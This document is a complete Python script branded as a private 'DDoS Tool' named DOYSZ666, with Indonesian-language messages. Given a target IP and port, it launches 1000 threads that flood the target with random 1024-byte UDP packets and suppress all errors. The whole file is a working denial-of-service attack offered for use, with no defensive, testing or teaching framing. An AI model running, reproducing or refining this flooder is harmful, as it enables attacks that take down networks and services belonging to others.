#!/usr/bin/env python3
"""
DOYSZ666 - DDoS Tool
PRIVATE BY : AnggazyNotdev
"""

import socket
import threading
import random
import time
import sys

class DOYSZ666:
    def __init__(self, target, port, threads=500):
        self.target = target
        self.port = port
        self.threads = threads
        self.is_attacking = False
        
    def generate_payload(self):
        # Payload acak untuk membanjiri jaringan
        payload = random._urandom(1024)
        return payload
    
    def attack(self):
        while self.is_attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(self.generate_payload(), (self.target, self.port))
                s.close()
            except:
                pass
    
    def start(self):
        self.is_attacking = True
        threads_list = []
        
        print(f"[DOYSZ666] Menyerang {self.target}:{self.port} dengan {self.threads} threads...")
        
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.is_attacking = False
        print("[DOYSZ666] Serangan dihentikan.")

def banner():
    print(r"""
       ██████╗  ██████╗ ██╗   ██╗███████╗███████╗         
       ██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔════╝╚══███╔╝         
       ██║  ██║██║   ██║ ╚████╔╝ ███████╗  ███╔╝          
       ██║  ██║██║   ██║  ╚██╔╝  ╚════██║ ███╔╝           
       ██████╔╝╚██████╔╝   ██║   ███████║███████╗         
       ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚══════╝                                                     
    """)
    print("\n" + "="*60)
    print("TOLLS DDOS PRIVATE BY : AnggazyNotdev".center(60))
    print("="*60 + "\n")

if __name__ == "__main__":
    banner()
    
    if len(sys.argv) != 3:
        print("Usage: python doysz666.py <target_ip> <port>")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    
    tool = DOYSZ666(target, port, threads=1000)
    
    try:
        tool.start()
    except KeyboardInterrupt:
        tool.stop()
